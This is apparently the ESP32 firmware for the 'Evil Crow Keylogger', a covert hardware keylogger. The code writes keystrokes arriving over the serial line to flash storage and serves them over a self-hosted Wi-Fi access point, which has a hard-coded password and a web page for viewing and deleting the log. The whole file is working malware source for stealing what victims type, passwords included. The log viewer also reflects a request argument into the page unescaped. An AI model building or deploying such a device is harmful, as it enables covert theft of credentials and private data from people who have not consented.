#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <EEPROM.h>
#include "SPIFFS.h"

String webString;

// Config SSID and password
const char* ssid = "Keylogger";  // Enter your SSID here
const char* password = "123456789";  //Enter your Password here

// HTML and CSS style
const String HTML_CSS_STYLING = "<html><head><meta charset=\"utf-8\"><title>Evil Crow Keylogger</title><style>     body {     background-color: #333333;     font-family: \"Century Gothic\", Arial;     color: white;     margin: 20px;}.myButton:link, .myButton:visited {background: linear-gradient(#777777, #444444);color: white;padding: 4px;min-width: 100px;border-radius: 5px;border: 2px solid white;text-align: center;margin-right: 20px;text-decoration: none;display: inline-block;transition: 0.25s;}  .myButton:hover, .myButton:active {background: linear-gradient(#888888, #555555);border: 2px solid deepskyblue;border-radius: 10px;transform: scale(1.15);}</style></head>";
const String MENU = "<body><p>Evil Crow Keylogger v1.1</p><div id=\"header\"><div id=\"menu\"><ul><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a></ul></div></div></style>";

// File
File logs;

// Web Server
WebServer server(80);

void setup() {
  Serial.begin(115200);
  delay(500);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);

  EEPROM.begin(4096);
  SPIFFS.begin();

  logs = SPIFFS.open("/logs.txt", "a+");

  server.on("/", []() {
    server.send(200, "text/html", HTML_CSS_STYLING + MENU);
  });

  server.on("/viewlog", [](){
    logs.close();
    String serverlog;
    serverlog += server.arg(0);
    logs = SPIFFS.open("/logs.txt");
    webString = logs.readString();
    logs.close();
    logs = SPIFFS.open("/logs.txt", "a+");
    server.send(200, "text/html", HTML_CSS_STYLING+ "View Log: "+serverlog +"\n-----\n"+webString+"</pre></h2>");
    loop(); 
  });

  server.on("/delete", [](){
    logs.close();
    logs = SPIFFS.open("/logs.txt", "w");
    server.send(200, "text/plain", "File cleared!" );
    webString="";
    logs.close();
    logs = SPIFFS.open("/logs.txt", "a+");
    loop();
  });
  server.begin();
}

void loop() {
  server.handleClient();

  if(Serial.available()) {
    logs.write(Serial.read());
  }
}
